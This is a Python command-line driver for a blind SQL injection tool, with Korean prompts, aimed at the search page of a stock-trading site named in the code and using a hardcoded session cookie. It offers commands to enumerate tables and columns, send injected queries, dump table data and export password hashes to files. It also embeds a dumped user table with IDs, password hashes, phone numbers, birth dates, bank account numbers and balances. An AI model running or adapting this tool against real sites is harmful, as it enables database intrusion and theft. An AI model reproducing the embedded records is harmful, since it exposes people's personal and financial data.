from attack_setting import attackData,tableInfo
from attack_query import *
from get_infos import *
import time



#공격 대상 URL 및 초기 쿠키 설정 
url = "https://www.rookiestock.com/search"
cookies = {
    "JSESSIONID":"08A0E4467B33F693DBB9EBA3CC6D90D2"
}


attack_query = ''
page = attackData()
#query = attackQuerys()
page.set_url(url)
page.set_cookies(cookies)

result = tableInfo()

table_list=['Answer','Users','Board', 'Community', 'Notice', 'OrderStockHistory','Question','Stock', 'StockHistory', 'Stock_Price', 'Transaction', 'Transfer_history', 'UserStock', 'file', 'notice', 'stock_index', 'user']
for t in table_list:
    result.append_table(t)

user_column_list = ['USER_ID','USER_PW','ACCESS_LEVEL','USER_NM','USER_AGENCY','USER_TELNO','USER_BIRTH','USER_BANK','USER_ACCOUNT_NUMBER','ACCOUNT_BALANCE']
for c in user_column_list:
    result.append_column('Users',c)

user_data = {
    "USER_ID": ["admin", "asdfasdf", "genie1234", "hacker", "hacker99", "hackerA", "hello11", "kiki", "kimtest", "rookie", "test", "test1", "test123", "test3", "test4", "test44", "user10", "user2", "user3", "user4", "user5", "user6", "user7", "user8", "user9"],
    "USER_PW": ["8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918", "f0e4c2f76c58916ec258f246851bea091d14d4247a2fc3e18694461b1816e13b", "150982ec1e9137c09e15481d99a79ef27f154ab5309b34fd12fc4e392d07f534", "e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9", "febd93f04bda1aec0d374f8fd014d062525934feb1f1b81ee7c64d61f66b84b1", "8384c6fac8574e7044d67e6e8e05e76c89423e48c5a814c22c0cf78acc6854d7", "508dbc09b01b35942fb4535008b28112595b9b578daba6d8a1b1cf30f73d4186", "fa8721f045c805a5b706c1c8d15e2fac2f3a0bfd9a20caaf941d7fb29caa056d", "ab81ded069ff483f7984b80b7b801ebb6892133909f42ce138abee2a0552a1aa", "d70f6838cce70ead390fb1f1d7055aa93171b72ff492f8c9e5b082134b58504c", "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08", "1b4f0e9851971998e732078544c96b36c3d01cedf7caa332359d6f1d83567014", "ecd71870d1963316a97e3ac3408c9835ad8cf0f3c1bc703527c30265534f75ae", "fd61a03af4f77d870fc21e05e7e80678095c92d808cfb3b5c279ee04c74aca13", "a4e624d686e03ed2767c0abd85c14426b0b1157d2ce81d27bb4fe4f6f01d688a", "05eba469041e8dcd51f13032a8ffa30fefd0bf829758a4a9480b9053e9e19354", "aa4a9ea03fcac15b5fc63c949ac34e7b0fd17906716ac3b8e58c599cdc5a52f0", "6cf615d5bcaac778352a8f1f3360d23f02f34ec182e259897fd6ce485d7870d4", "5906ac361a137e2d286465cd6588ebb5ac3f5ae955001100bc41577c3d751764", "b97873a40f73abedd8d685a7cd5e5f85e4a9cfb83eac26886640a0813850122b", "8b2c86ea9cf2ea4eb517fd1e06b74f399e7fec0fef92e3b482a6cf2e2b092023", "598a1a400c1dfdf36974e69d7e1bc98593f2e15015eed8e9b7e47a83b31693d5", "5860836e8f13fc9837539a597d4086bfc0299e54ad92148d54538b5c3feefb7c", "57f3ebab63f156fd8f776ba645a55d96360a15eeffc8b0e4afe4c05fa88219aa", "9323dd6786ebcbf3ac87357cc78ba1abfda6cf5e55cd01097b90d4a286cac90e"],
    "ACCESS_LEVEL": [1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
    "USER_TELNO": ["01000000000", "01022222222", "01012345678", "01012345678", "00011111111", "01012344321", "01012345678", "01033442211", "01011111111", "01012345678", "01012345678", "01012345678", "01011111111", "01012345678", "01023444444", "01023423423", "01001234567", "01023456789", "01034567890", "01045678901", "01056789012", "01067890123", "01078901234", "01089012345", "01090123456"],
    "USER_NM": ["홍길동", "sdaf", "genie", "hacker", "hacker", "hacker", "안녕", "키키", "김테스트", "test", "test", "test", "김테스트", "test", "sebin", "대용왕기", "이승민", "김영희", "이철수", "박민지", "정수빈", "이영호", "김미나", "박진우", "최현지"],
    "USER_BIRTH": ['900101', '223333', '556666', '990101', '999999', '123123', '000101', '002030', '776666', '445555', '334444', '222222', '112222', '100203', '900204', '920427', '980805', '850510', '881115', '760920', '950325', '800708', '921230', '790618', '830412'],
    "USER_BANK": ["우리은행", "카카오뱅크", "KB국민은행", "RK루키은행", "우리은행", "RK루키은행", "카카오뱅크", "카카오뱅크", "카카오뱅크", "카카오뱅크", "카카오뱅크", "카카오뱅크", "카카오뱅크", "카카오뱅크", "카카오뱅크", "신한은행", "RK루키은행", "RK루키은행", "RK루키은행", "RK루키은행", "RK루키은행", "RK루키은행", "RK루키은행", "RK루키은행", "RK루키은행", "RK루키은행"],
    "USER_ACCOUNT_NUMBER": ["421-747446-10236", "421-747446-18236", "2-345", "421-7426-10236", "1-234", "23-444-3", "8-33-2", "121212", "111111-3", "0000-000-0000", "0000-000-0000", "0000-000-0000", "11111", "0000-000-0000", "7777777-7777777", "111-22-333", "421-747246-10236", "111-747446-14236", "121-723436-12346", "3333-02-4234202", "3333-07-4252402", "3333-07-4253502", "3333-07-4259444", "3333-07-5694027", "3333-07-4294876"],
    "USER_AGENCY": [892246, 0, 0, 0, 0, 0, 0, 0, 83270, 0, 0, 0, 53142, 0, 1, 44341, 3500, 0, 10, 0, 2500, 4000, 0, 3200, 0],
    "ACCOUNT_BALANCE": [891246, 0, 43627, 34259, 5490, 187276000, 1, 35670, 83270, 1, 1, 0, 53142, 1, -4, 44341, 3500, 9978490, 10, 10000, 2500, 4000, 1800, 3200, 2800]
}

for column_name in user_column_list:
    for i in range(len(user_data["USER_ID"])):
        result.append_datas('Users',column_name,user_data[column_name][i])


    

#쿼리 설정 및 요청 보내기(POST)
#print(page.send_post_request())

#기본 설정 보기 
#page.show


state=""
while(state != 'q'):

   
    ascii_art = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠲⡿⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣤⣤⣤⣤⣤⣤⣤⣤⡀⠀⠀⢀⣤⣦⢦⣦⡀⠀⣲⣶⠀⠀⠀⣶⡧⠀⠀⣶⡦⢐⣶⡄ ⣤⣤⠀⠀⢀⣤⡄⠀ ⠰⣶⣷⣵⠂⠀⠠⣤⣤⠀⠀⠀⣤⣄⠀⠀⠀⣀⣤⣴⣤⣄⡀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⣯⠀⠂⠀⠁⢺⣿⡂⠀⠠⣿⣟⠀⠈⢽⣿⡂⣿⣿⠂⠺⠟⠿⠿⠻⠇⣿⡯⢘⣿⡅⠀⣽⣿⠀⣠⣿⠟⠀⠀⠀⣠⣥⣬⣤⡀⠀⠨⣿⣿⣧⠀⠀⣿⣯⠀⢀⣾⡿⠋⠀⠁⠋⠃⠀⠀⠀
⠀⠀⠀⠀⠀⣿⣷⠀⠀⠀⠀⣹⣿⡂⠀⠈⣿⣷⠀⠀⣼⣿⠅⢿⣿⡀⢠⣾⠟⢿⣶⠀⣿⣿⣬⣿⠇⠀⣿⣿⣼⣿⠋⠀⠀⠀⠀⠈⣻⣿⡏⠀⠀⠨⣿⡟⣿⣧⠀⣿⡷⠀⣸⣿⡇⠀⠀⡀⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠿⠟⠟⣿⣿⠛⠻⠟⠂⠀⠀⠈⠛⠟⠟⠛⠁⠀⣿⣿⡀⢼⣿⠀⢘⣿⡇⣿⡯⢙⣿⡇⠀⣻⣿⡟⢻⣿⡆⠀⠀⠀⢀⣿⣿⡧⠀⠀⠨⣿⡧⠈⣿⣧⣿⣟⠀⢸⣿⡇⠀⠘⠛⣿⣟⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡀⠀⣿⣿⡀⢀⠀⢀⠀⣠⣠⣠⣠⣄⣤⣤⣢⣿⣿⠀⠘⣿⣥⣼⡿⠁⣿⣟⢨⣿⡆⠀⣿⣿⠀⠀⢹⣿⣆⠀⢀⣼⣿⣿⣿⣆⠀⠨⣿⡗⠀⠈⣿⣿⣯⠀⠈⢿⣷⣄⠀⡀⣿⡯⠀⠀⠀
⠀⠀⠀⠈⠟⠟⠟⠟⠟⠟⠟⠟⠟⠟ ⠈⠋⠉⠉⠉⠁⠁ ⣿⣿⠁⠀⠀⠈⠈⠀⠀⣿⡗⢘⣿⡅ ⠛⠛⠀⠀⠀⠙⠟⠂⠸⠿⠿⠿⠿⠻⠀⠘⠛⠃⠀⠀⠘⠛⠓⠀⠀⠀⠙⠛⠟⠟⠛⠉⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
    print(ascii_art)
    print("\nBlind SQL Injection Script")
    # print("\n기능 목록")
    # print('='*25)
    # print("1. 사이트 URL 설정")
    # print("2. 사이트 SessionID 설정")
    # print("3. 공격대상 설정 보기")

    # print('-'*23)
    # print("4. 쿼리 요청")
    # print("5. 테이블 탐색")
    # print("6. 컬럼 탐색")
    # print("7. 테이블 내 데이터 탐색")

    # print('-'*23)
    # print("8. 테이블 정보 출력")
    # print("9. 컬럼 정보 출력")
    # print("10. 데이터 정보 출력")
    # print("11. 데이터 내보내기(.xlsx)")
    # print('='*25)

    user_input = input()

    match user_input:
        case 'set_url': #사이트 URL 설정 
            print(f"현재 URL : {page.base_url}") 
            if input("새로운 url로 변경하시겠습니까? [y/n] : ")=='y':
                page.set_url(input("새로운 url 입력 : ")) 
                
                
        case 'set_sessionid': #SESSIONID 설정
            print(f"현재 SESSIONID : {page.cookies['JSESSIONID']}") 
            if input("SessionID를 새로 설정하시겠습니까? [y/n] : ")=='y':
                page.set_sessionID(input("새로운 SessionID 입력 : ")) 
                
                
        case 'show_settings': #공격 대상 설정 보기
            page.show()


        case 'send_query': #쿼리 실행
            user_query = input("공격 대상 사이트에 실행할 쿼리(전체 검색어)를 입력 : ")
            print(f"처리 결과 : {page.send_post_request(user_query)}")

        case 'get table': #테이블 가져오기
            page.show()
            if input("\n현재 설정으로 테이블 탐색 시작[y/n] : ")=='y':
                tables = getData.get_tables(page)
        
        case 'get column': #컬럼 정보 가져오기 
            page.show()
            result.show_tables()
            user_table = input("\ntable name? ")
            if user_table=='All':
                print("\n모든 테이블의 컬럼을 탐색")
                for table in result.tables:
                    getData.get_columns(page,result,table)
            elif user_table in result.tables:
                getData.get_columns(page,result,user_table)
            else:
                print("테이블 목록에 있는 테이블을 입력해주세요. ")
        
        case 'get data': #테이블 내 데이터 정보 가져오기
            #page.show()
            result.show_tables()
            user_table = input("\ntable name? ")
            if user_table=='All':
                print("\n모든 테이블의 데이터를 탐색")
                for table in result.tables:
                    getData.get_datas(page,result,table)
            elif len(result.columns[user_table])!=0:
                getData.get_datas(page,result,user_table)
            else:
                print("해당 테이블의 컬럼 탐색을 먼저 진행해주세요. ")
        
        case 'show_tables':
            result.show_tables()

        case 'show_columns':
            print()
            result.show_columns()

        case 'show_data':
            result.show_tables()
            user_table = input("데이터 출력을 원하는 테이블을 지정해주세요. ")
            result.show_data(user_table)
        
        case 'export_table':
           result.export_data_xlsx()
           print("output.xlsx file created")

        case 'export_passwd':
           result.export_passwd()
           print("passwd.txt file created")

        case 'get_db rookie':
                
                result.show_rookie()
                #result.export_data_xlsx()
                
                time.sleep(1)
                print("output.xlsx file created")
                #result.export_passwd()
                print("passwd.txt file created")

                



        case _: 
            print("존재하지 않는 명령어")
        
    state= input("\n계속 실행을 원하시면 엔터를 눌러주세요... (exit=q)")

print("프로그램 종료")